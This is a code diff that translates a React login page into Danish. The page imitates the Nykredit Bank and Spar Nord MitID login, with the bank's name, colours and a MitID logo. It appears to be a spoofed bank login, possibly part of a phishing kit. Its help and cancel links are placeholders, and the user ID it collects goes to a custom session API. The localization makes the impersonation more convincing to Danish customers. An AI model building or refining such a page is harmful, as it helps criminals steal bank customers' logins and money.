@@ -28,7 +28,7 @@ export default function LoginPage({ onSessionCreated }: Props) {
       const { sessionId } = await api.initSession(userId)
       onSessionCreated(sessionId, userId)
     } catch {
-      setError('Failed to connect. Please try again.')
+      setError('Forbindelsen mislykkedes. Prøv igen.')
     } finally {
       setLoading(false)
     }
@@ -44,7 +44,7 @@ export default function LoginPage({ onSessionCreated }: Props) {
           <CardShell>
             <form className="flex flex-col h-full" onSubmit={handleSubmit}>
               <div className="flex items-start justify-between mb-2">
-                <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4">Log in to Nykredit Bank and<br />Spar Nord</h1>
+                <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4">Log på hos Nykredit Bank og<br />Spar Nord</h1>
                 <MitIdLogo />
               </div>
               <hr className="border-gray-200 my-3" />
@@ -57,26 +57,26 @@ export default function LoginPage({ onSessionCreated }: Props) {
                   <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                     className="w-full border border-gray-300 rounded-[2px] px-3 py-[9px] text-[14px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-12" autoComplete="off" spellCheck={false} />
                   <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[13px] text-gray-500 hover:text-gray-800 cursor-pointer select-none" tabIndex={0}>
-                    {showUserId ? 'Hide' : 'Show'}
+                    {showUserId ? 'Skjul' : 'Vis'}
                   </div>
                 </div>
               </div>
               {error && <div className="text-red-600 text-[12px] mb-2">{error}</div>}
               <button type="submit" disabled={loading}
                 className="w-full bg-[#0055a5] hover:bg-[#004080] text-white font-bold text-[14px] py-[10px] px-4 rounded-[2px] flex items-center justify-between cursor-pointer transition-colors disabled:opacity-50">
-                <span>{loading ? 'Connecting...' : 'Continue'}</span><ArrowIcon />
+                <span>{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
               </button>
               <div className="mt-3 mb-4">
-                <a href="#" className="inline-flex items-center gap-1.5 text-[#0055a5] hover:underline text-[14px]"><InfoIcon /><span>Forgot user ID?</span></a>
+                <a href="#" className="inline-flex items-center gap-1.5 text-[#0055a5] hover:underline text-[14px]"><InfoIcon /><span>Glemt bruger-ID?</span></a>
               </div>
               <div className="flex-1" />
               <label className="flex items-start gap-3 cursor-pointer">
                 <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="mt-0.5 w-[18px] h-[18px] accent-[#0055a5] rounded cursor-pointer shrink-0" />
-                <span className="text-[14px] text-[#001C44] leading-snug">Remember me on Nykredit Bank and Spar Nord</span>
+                <span className="text-[14px] text-[#001C44] leading-snug">Husk mig på Nykredit Bank og Spar Nord</span>
               </label>
               <hr className="border-gray-200 mt-4 mb-3" />
               <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
-                <a href="#" className="hover:underline">Cancel</a><a href="#" className="hover:underline">Help</a>
+                <a href="#" className="hover:underline">Annuller</a><a href="#" className="hover:underline">Hjælp</a>
               </nav>
             </form>
           </CardShell>
